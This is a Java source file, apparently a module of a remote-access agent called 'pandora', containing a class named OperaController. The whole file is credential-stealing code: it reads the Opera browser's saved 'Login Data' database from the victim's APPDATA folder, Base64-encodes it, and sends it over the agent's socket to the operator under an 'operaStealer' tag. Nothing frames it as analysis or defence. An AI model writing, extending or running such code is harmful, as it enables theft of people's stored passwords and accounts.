package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class OperaController {

    private final Client client;

    public OperaController(final Client client) {
        this.client = client;
    }

    public void execute(final String requestId) {
        final File file = new File(System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data");
        String result = "An error occurred";
        try {
            final FileInputStream fileInputStream = new FileInputStream(file);
            final byte[] data = new byte[(int) file.length()];
            fileInputStream.read(data);
            fileInputStream.close();
            result = Base64.getEncoder().encodeToString(data);
        } catch (final IOException ignore) {
        }
        this.client.getSocketUtils().write("operaStealer:" + requestId + ":" + result);
    }
}